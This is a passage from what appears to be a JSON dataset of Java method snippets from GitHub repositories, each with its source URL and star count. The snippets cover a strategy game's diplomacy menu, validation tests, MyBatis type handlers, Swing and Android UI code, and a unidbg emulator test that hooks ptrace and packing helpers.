["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void select(int i) {\n        if (!enabled(i))\n            return;\n\n        log(\"DiplomacyTechOfferMenu - selected: \", str(i));\n\n        // exit if selected last option (forget it)\n        if (i == counterOffers.size()) {\n            escape();\n            return;\n        }\n\n        // get the reply which contains text response from AI\n        DiplomaticReply reply = diplomat().diplomatAI().receiveCounterOfferTech(player(), requestedTech, counterOffers.get(i));\n\n        // resume turn after reply is clicked\n        reply.resumeTurn(true);\n\n        log(\"Replying to tech offer\");\n        // show reply confirmation from AI\n        DiplomaticMessage.reply(DiplomacyRequestReply.create(diplomat(), reply));\t\n        log(\"Replying to tech offer - finished\");\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57908, "method_name": "escape", "class_name": "DiplomacyTechOfferMenu", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void escape() {\n        session().resumeNextTurnProcessing();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57909, "method_name": "decode", "class_name": "DiplomacyTechOfferMenu", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String decode(String encodedMessage) { \n        String s1 = super.decode(encodedMessage); \n        s1 = s1.replace(\"[tech]\", requestedTech.name());\n        return s1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/DiplomacyTechOfferMenu.java", "stars": "74", "class_props": {"extends": "DiplomacyRequestReply", "implements": null, "modifiers": ["public"]}}, {"id": 57910, "method_name": "main", "class_name": "Demo01List", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa\u4e00\u4e2aList\u96c6\u5408,\u5b58\u50a8\u59d3\u540d\n        List<String> list = new ArrayList<>();\n        list.add(\"\u5f20\u65e0\u5fcc\");\n        list.add(\"\u5468\u82b7\u82e5\");\n        list.add(\"\u8d75\u654f\");\n        list.add(\"\u5f20\u5f3a\");\n        list.add(\"\u5f20\u4e09\u4e30\");\n\n        //\u5bf9list\u96c6\u5408\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u8fc7\u6ee4,\u53ea\u8981\u4ee5\u5f20\u5f00\u5934\u7684\u5143\u7d20,\u5b58\u50a8\u5230\u4e00\u4e2a\u65b0\u7684\u96c6\u5408\u4e2d\n        List<String> listA = new ArrayList<>();\n        for(String s : list){\n            if(s.startsWith(\"\u5f20\")){\n                listA.add(s);\n            }\n        }\n\n        //\u5bf9listA\u96c6\u5408\u8fdb\u884c\u8fc7\u6ee4,\u53ea\u8981\u59d3\u540d\u957f\u5ea6\u4e3a3\u7684\u4eba,\u5b58\u50a8\u5230\u4e00\u4e2a\u65b0\u96c6\u5408\u4e2d\n        List<String> listB = new ArrayList<>();\n        for (String s : listA) {\n            if(s.length()==3){\n                listB.add(s);\n            }\n        }\n\n        //\u904d\u5386listB\u96c6\u5408\n        for (String s : listB) {\n            System.out.println(s);\n        }\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo01/Stream/Demo01List.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57911, "method_name": "testAllExistSucess", "class_name": "TestValidationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testAllExistSucess() {\n    String[] keys = {\"a\", \"b\", \"c\", \"d\"};\n    ValidationUtils.validateAllOrNone(PROPS, keys);\n    ValidationUtils.validateAllNotEmpty(PROPS, keys);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestValidationUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57912, "method_name": "testAllExistFail", "class_name": "TestValidationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testAllExistFail() {\n    ValidationUtils.validateAllNotEmpty(PROPS, \"x\", \"y\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestValidationUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57913, "method_name": "testAllExistFail2", "class_name": "TestValidationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testAllExistFail2() {\n    ValidationUtils.validateAllNotEmpty(PROPS, \"a\", \"y\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestValidationUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57914, "method_name": "testNoneExistSuccess", "class_name": "TestValidationUtils", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testNoneExistSuccess() {\n    ValidationUtils.validateAllOrNone(PROPS, \"z\");\n    ValidationUtils.validateAllOrNone(PROPS, \"e\", \"f\", \"g\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestValidationUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57915, "method_name": "toString", "class_name": "CrawlSourceVO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return super.toString();\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-crawl/src/main/java/com/java2nb/novel/vo/CrawlSourceVO.java", "stars": "137", "class_props": {"extends": "CrawlSource", "implements": null, "modifiers": ["public"]}}, {"id": 57916, "method_name": "setNonNullParameter", "class_name": "LocalDateTypeHandler", "params": ["PreparedStatement", "int", "LocalDate", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, LocalDate parameter, JdbcType jdbcType)\n          throws SQLException {\n    ps.setObject(i, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 57917, "method_name": "getNullableResult", "class_name": "LocalDateTypeHandler", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalDate", "snippet": "  public LocalDate getNullableResult(ResultSet rs, String columnName) throws SQLException {\n    return rs.getObject(columnName, LocalDate.class);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 57918, "method_name": "getNullableResult", "class_name": "LocalDateTypeHandler", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalDate", "snippet": "  public LocalDate getNullableResult(ResultSet rs, int columnIndex) throws SQLException {\n    return rs.getObject(columnIndex, LocalDate.class);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 57919, "method_name": "getNullableResult", "class_name": "LocalDateTypeHandler", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "LocalDate", "snippet": "  public LocalDate getNullableResult(CallableStatement cs, int columnIndex) throws SQLException {\n    return cs.getObject(columnIndex, LocalDate.class);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/LocalDateTypeHandler.java", "stars": "15", "class_props": {"extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"id": 57920, "method_name": "initComponents", "class_name": "RMT", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initComponents() {\n\n        jLabel2 = new javax.swing.JLabel();\n        jButton3 = new javax.swing.JButton();\n        jButton4 = new javax.swing.JButton();\n        jLabel1 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jLabel2.setFont(new java.awt.Font(\"Tahoma\", 0, 18)); // NOI18N\n        jLabel2.setText(\"READ - ME TRANSFER\");\n\n        jButton3.setText(\"Chat Box\");\n        jButton3.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton3ActionPerformed(evt);\n            }\n        });\n\n        jButton4.setText(\"File Transfer\");\n        jButton4.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton4ActionPerformed(evt);\n            }\n        });\n\n        jLabel1.setText(\"Select option to continue\");\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 178, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n            .addGroup(layout.createSequentialGroup()\n                .addGap(141, 141, 141)\n                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 130, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addContainerGap(141, Short.MAX_VALUE))\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                    .addComponent(jButton3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                    .addComponent(jButton4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n                .addGap(152, 152, 152))\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addContainerGap(39, Short.MAX_VALUE)\n                .addComponent(jLabel2)\n                .addGap(56, 56, 56)\n                .addComponent(jLabel1)\n                .addGap(28, 28, 28)\n                .addComponent(jButton3)\n                .addGap(18, 18, 18)\n                .addComponent(jButton4)\n                .addGap(77, 77, 77))\n        );\n\n        pack();\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/RMT.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 57921, "method_name": "jButton3ActionPerformed", "class_name": "RMT", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed\n        //Main m = new Main();\n        ChatBox c = new ChatBox();\n        c.frame();\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/RMT.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 57922, "method_name": "jButton4ActionPerformed", "class_name": "RMT", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jButton4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton4ActionPerformed\n        // TODO add your handling code here:\n        LoginFrame lf = new LoginFrame();\n        lf.frame();\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/RMT.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 57923, "method_name": "main", "class_name": "RMT", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(RMT.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            java.util.logging.Logger.getLogger(RMT.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(RMT.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(RMT.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new RMT().setVisible(true);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/RMT.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 57924, "method_name": "bIsLogin", "class_name": "UserManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean bIsLogin() {\n        if (TextUtils.isEmpty(getName())) {\n            return false;\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_common/src/main/java/com/hl/base_module/appcomponent/UserManager.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57925, "method_name": "getName", "class_name": "UserManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getName() {\n        return SharedPreferencesUtil.getInstance(CommonApi.getApplication()).getSP(userKey());\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_common/src/main/java/com/hl/base_module/appcomponent/UserManager.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57926, "method_name": "saveUser", "class_name": "UserManager", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveUser(String name) {\n        SharedPreferencesUtil.getInstance(CommonApi.getApplication()).putSP(userKey(), name);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_common/src/main/java/com/hl/base_module/appcomponent/UserManager.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57927, "method_name": "clearCount", "class_name": "UserManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void clearCount() {\n        SharedPreferencesUtil.getInstance(CommonApi.getApplication()).putSP(userKey(), \"\");\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_common/src/main/java/com/hl/base_module/appcomponent/UserManager.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57928, "method_name": "userKey", "class_name": "UserManager", "params": [], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "    private static String userKey() {\n        return \"user_key\";\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/librarys/lib_common/src/main/java/com/hl/base_module/appcomponent/UserManager.java", "stars": "14", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57929, "method_name": "onCreate", "class_name": "DeliveryHome", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_fragment_container);\n\n        if(savedInstanceState==null)\n        {\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container,new DeliveryGuyHomeFragment())\n                    .commitNow();\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSellerModule/DashboardDeliveryGuy/DeliveryHome.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 57930, "method_name": "create", "class_name": "ViewHolderCurrentMarket", "params": ["ViewGroup", "Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "ViewHolderCurrentMarket", "snippet": "    public static ViewHolderCurrentMarket create(ViewGroup parent, Context context)\n    {\n\n        View view = LayoutInflater.from(parent.getContext())\n                .inflate(R.layout.list_item_market_current,parent,false);\n\n        return new ViewHolderCurrentMarket(view,context);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderMarket/ViewHolderCurrentMarket.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57931, "method_name": "setItem", "class_name": "ViewHolderCurrentMarket", "params": ["Market"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItem(Market item)\n    {\n\n        this.configurationLocal = item;\n\n        marketName.setText(configurationLocal.getServiceName());\n        marketAddress.setText(configurationLocal.getAddress() + \", \" + configurationLocal.getCity());\n//        distance.setText(\"Distance : \" + String.format(\"%.2f\",configurationLocal.getRt_distance()));\n        marketDescription.setText(configurationLocal.getDescriptionShort());\n\n\n\n        String imagePath = PrefGeneral.getServiceURL(context)\n                + \"/api/serviceconfiguration/Image/three_hundred_\" + configurationLocal.getLogoImagePath() + \".jpg\";\n\n\n//                System.out.println(\"Service LOGO : \" + imagePath);\n\n        Drawable placeholder = VectorDrawableCompat\n                .create(context.getResources(),\n                        R.drawable.ic_nature_people_white_48px, context.getTheme());\n\n\n        Picasso.get()\n                .load(imagePath)\n                .placeholder(placeholder)\n                .into(marketPhoto);\n\n\n\n        if(PrefLoginGlobal.getUser(context)==null)\n        {\n            // logged out\n            logOutButton.setVisibility(View.INVISIBLE);\n        }\n        else\n        {\n            logOutButton.setVisibility(View.VISIBLE);\n        }\n\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderMarket/ViewHolderCurrentMarket.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57932, "method_name": "logOutClick", "class_name": "ViewHolderCurrentMarket", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void logOutClick()\n    {\n        AlertDialog.Builder dialog = new AlertDialog.Builder(context);\n\n        dialog.setTitle(\"Confirm Logout !\")\n                .setMessage(\"Do you want to log out !\")\n                .setPositiveButton(\"Yes\",new DialogInterface.OnClickListener(){\n\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n\n                        logout();\n\n                    }\n                })\n                .setNegativeButton(\"No\",new DialogInterface.OnClickListener() {\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n\n                        showToastMessage(\"Cancelled !\");\n                    }\n                })\n                .show();\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderMarket/ViewHolderCurrentMarket.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57933, "method_name": "logout", "class_name": "ViewHolderCurrentMarket", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void logout()\n    {\n        // log out\n        PrefLogin.saveUserProfile(null,context);\n        PrefLogin.saveCredentialsPassword(context,null,null);\n\n        PrefLoginGlobal.saveUserProfile(null,context);\n        PrefLoginGlobal.saveCredentialsPassword(context,null,null);\n\n\n        if(context instanceof NotifyAboutLogin)\n        {\n            ((NotifyAboutLogin) context).loggedOut();\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderMarket/ViewHolderCurrentMarket.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57934, "method_name": "showToastMessage", "class_name": "ViewHolderCurrentMarket", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void showToastMessage(String message)\n    {\n        Toast.makeText(context,message, Toast.LENGTH_SHORT).show();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderMarket/ViewHolderCurrentMarket.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57935, "method_name": "main", "class_name": "AndroidServerTest", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {\n        new AndroidServerTest().test();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/test/java/com/github/unidbg/android/ida/AndroidServerTest.java", "stars": "16", "class_props": {"extends": null, "implements": ["IOResolver", "PTrace"], "modifiers": ["public"]}}, {"id": 57936, "method_name": "resolve", "class_name": "AndroidServerTest", "params": ["Emulator<AndroidFileIO>", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "FileResult<AndroidFileIO>", "snippet": "    public FileResult<AndroidFileIO> resolve(Emulator<AndroidFileIO> emulator, String pathname, int oflags) {\n        final int attachPid = emulator.getPid() - 1;\n        if ((\"/proc/\" + attachPid + \"/maps\").equals(pathname)) {\n            return FileResult.<AndroidFileIO>success(new MapsFileIO(oflags, pathname, emulator.getMemory().getLoadedModules()));\n        }\n        if ((\"/proc/\" + attachPid + \"/cmdline\").equals(pathname)) {\n            return FileResult.<AndroidFileIO>success(new ByteArrayFileIO(oflags, pathname, (\"/system/bin/\" + executable.getName()).getBytes()));\n        }\n        if ((\"/proc/\" + attachPid + \"/task/\" + attachPid + \"/comm\").equals(pathname)) {\n            return FileResult.<AndroidFileIO>success(new ByteArrayFileIO(oflags, pathname, (executable.getName() + \"\\n\").getBytes()));\n        }\n        if ((\"/proc/\" + attachPid + \"/exe\").equals(pathname) || \"/system/bin/android_server\".equals(pathname)) {\n            return FileResult.<AndroidFileIO>success(new SimpleFileIO(oflags, executable, pathname));\n        }\n        if (\"/proc\".equals(pathname)) {\n            return FileResult.<AndroidFileIO>success(new DirectoryFileIO(oflags, pathname, new DirectoryFileIO.DirectoryEntry(false, Integer.toString(attachPid))));\n        }\n        if ((\"/proc/\" + attachPid).equals(pathname)) {\n            return FileResult.<AndroidFileIO>success(new DirectoryFileIO(oflags, pathname,\n                    new DirectoryFileIO.DirectoryEntry(true, \"maps\"),\n                    new DirectoryFileIO.DirectoryEntry(true, \"cmdline\"),\n                    new DirectoryFileIO.DirectoryEntry(true, \"exe\"),\n                    new DirectoryFileIO.DirectoryEntry(false, \"task\")));\n        }\n\n        return null;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/test/java/com/github/unidbg/android/ida/AndroidServerTest.java", "stars": "16", "class_props": {"extends": null, "implements": ["IOResolver", "PTrace"], "modifiers": ["public"]}}, {"id": 57937, "method_name": "test", "class_name": "AndroidServerTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void test() {\n        IxHook ixHook = XHookImpl.getInstance(emulator);\n        ixHook.register(executable.getName(), \"ptrace\", new ReplaceCallback() {\n            @Override\n            public HookStatus onCall(Emulator<?> emulator, long originFunction) {\n                RegisterContext context = emulator.getContext();\n                int request = context.getIntArg(0);\n                Pointer addr = context.getPointerArg(2);\n                Pointer data = context.getPointerArg(3);\n                if (request != PTrace.PTRACE_PEEKTEXT && request != PTrace.PTRACE_POKEDATA) {\n                    System.out.println(\"ptrace request=\" + request + \", addr=\" + addr + \", data=\" + data + \", LR=\" + context.getLRPointer());\n                }\n                return super.onCall(emulator, originFunction);\n            }\n        });\n        /*ixHook.register(executable.getName(), \"__aeabi_memcpy\", new ReplaceCallback() {\n            @Override\n            public HookStatus onCall(Emulator<?> emulator, long originFunction) {\n                RegisterContext context = emulator.getContext();\n                Pointer dest = context.getPointerArg(0);\n                Pointer src = context.getPointerArg(1);\n                int size = context.getIntArg(2);\n                Inspector.inspect(src.getByteArray(0, size), \"qmemcpy dest=\" + dest + \", src=\" + src + \", LR=\" + context.getLRPointer());\n                return super.onCall(emulator, originFunction);\n            }\n        });*/\n        ixHook.refresh();\n\n        IHookZz hookZz = HookZz.getInstance(emulator);\n        /*hookZz.replace(0x4005DA2D, new ReplaceCallback() {\n            @Override\n            public HookStatus onCall(Emulator<?> emulator, long originFunction) {\n                RegisterContext context = emulator.getContext();\n                Pointer pointer = context.getPointerArg(1);\n                Pointer buf = pointer.getPointer(0);\n                int size = pointer.getInt(4);\n                System.out.println(\"sendto buf=\" + buf + \", size=\" + size + \", LR=\" + context.getLRPointer());\n                return super.onCall(emulator, originFunction);\n            }\n        });*/\n        Symbol pack_dd = module.findSymbolByName(\"pack_dd\", false);\n        hookZz.wrap(pack_dd, new WrapCallback<HookZzArm32RegisterContext>() {\n            @Override\n            public void preCall(Emulator<?> emulator, HookZzArm32RegisterContext ctx, HookEntryInfo info) {\n                Pointer data = ctx.getPointerArg(0);\n                int value = ctx.getIntArg(2);\n                ctx.push(data);\n                ctx.push(value & 0xffffffffL);\n            }\n            @Override\n            public void postCall(Emulator<?> emulator, HookZzArm32RegisterContext ctx, HookEntryInfo info) {\n                super.postCall(emulator, ctx, info);\n                long value = ctx.pop();\n                UnicornPointer data = ctx.pop();\n                UnicornPointer end = ctx.getPointerArg(0);\n                int size = (int) (end.toUIntPeer() - data.toUIntPeer());\n                byte[] my = Utils.pack_dd(value);\n                byte[] ida = data.getByteArray(0, size);\n                long unpack = Utils.unpack_dd(ByteBuffer.wrap(ida));\n                if (!Arrays.equals(my, ida) || unpack != value) {\n                    Inspector.inspect(ida, \"pack_dd value=0x\" + Long.toHexString(value) + \", unpack=0x\" + Long.toHexString(unpack) + \", my=\" + Hex.encodeHexString(my));\n                }\n            }\n        });\n        Symbol pack_dq = module.findSymbolByName(\"pack_dq\", false);\n        hookZz.wrap(pack_dq, new WrapCallback<HookZzArm32RegisterContext>() {\n            @Override\n            public void preCall(Emulator<?> emulator, HookZzArm32RegisterContext ctx, HookEntryInfo info) {\n                Pointer data = ctx.getPointerArg(0);\n                long low = ctx.getIntArg(2);\n                long high = ctx.getIntArg(3);\n                ctx.push(data);\n                ctx.push((high << 32) | low);\n            }\n            @Override\n            public void postCall(Emulator<?> emulator, HookZzArm32RegisterContext ctx, HookEntryInfo info) {\n                super.postCall(emulator, ctx, info);\n                long value = ctx.pop();\n                UnicornPointer data = ctx.pop();\n                UnicornPointer end = ctx.getPointerArg(0);\n                int size = (int) (end.toUIntPeer() - data.toUIntPeer());\n                byte[] my = Utils.pack_dq(value);\n                byte[] ida = data.getByteArray(0, size);\n                long unpack = Utils.unpack_dq(ByteBuffer.wrap(ida));\n                if (!Arrays.equals(my, ida) || unpack != value) {\n                    Inspector.inspect(ida, \"pack_dq value=0x\" + Long.toHexString(value) + \", unpack=0x\" + Long.toHexString(unpack) + \", my=\" + Hex.encodeHexString(my));\n                }\n            }\n        });\n        Symbol unpack_dd = module.findSymbolByName(\"unpack_dd\", false);\n        hookZz.wrap(unpack_dd, new WrapCallback<HookZzArm32RegisterContext>() {\n            @Override\n            public void preCall(Emulator<?> emulator, HookZzArm32RegisterContext ctx, HookEntryInfo info) {\n                Pointer pointer = ctx.getPointerArg(0);\n                Pointer data = pointer.getPointer(0);\n                Pointer end = ctx.getPointerArg(1);\n                ctx.push(data);\n                ctx.push(end);\n            }\n            @Override\n            public void postCall(Emulator<?> emulator, HookZzArm32RegisterContext ctx, HookEntryInfo info) {\n                super.postCall(emulator, ctx, info);\n                UnicornPointer end = ctx.pop();\n                UnicornPointer data = ctx.pop();\n                long value = ctx.getR0Int() & 0xffffffffL;\n                int size = (int) (end.toUIntPeer() - data.toUIntPeer());\n                byte[] bytes = data.getByteArray(0, size);\n                long my = Utils.unpack_dd(ByteBuffer.wrap(bytes));\n                if (value != my) {\n                    Inspector.inspect(bytes, \"unpack_dd data=\" + data + \", value=0x\" + Long.toHexString(value) + \", LR=\" + ctx.getLRPointer());\n                }\n            }\n        });\n        Symbol unpack_dq = module.findSymbolByName(\"unpack_dq\", false);\n        